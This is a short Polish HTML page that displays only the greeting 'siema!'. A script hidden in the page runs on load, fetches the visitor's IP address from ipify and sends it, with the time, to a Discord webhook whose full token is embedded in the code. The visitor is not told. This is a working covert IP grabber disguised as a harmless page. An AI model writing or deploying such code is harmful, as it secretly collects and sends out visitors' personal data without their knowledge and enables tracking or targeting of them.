<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>siema</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#fff; color:#000; font-family:system-ui,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
  <h1 style="font-size:64px;">siema!</h1>

  <script>
    // ⚠️ WKLEJ TU SWÓJ NOWY WEBHOOK
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1552425060147404841/MRjqZCgiycy-LvH4hrlEw14WO0DHjek7IUmVVdr1ov9qrARSXm2UqfpoU4D0psaXuq2h";

    async function logVisit() {
      let ip = 'brak';

      // IP z API
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        ip = json.ip || 'brak';
      } catch (e) {
        console.error('Nie udało się pobrać IP:', e);
      }

      const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
      const content = `**IP:** \`${ip}\`\n**time:** ${time}`;

      // Normalny fetch, bez no-cors – Discord wspiera CORS
      try {
        const r = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content })
        });
        console.log('Discord status:', r.status);
      } catch (e) {
        console.error('Błąd wysyłki:', e);
      }
    }

    logVisit();
  </script>
</body>
</html>
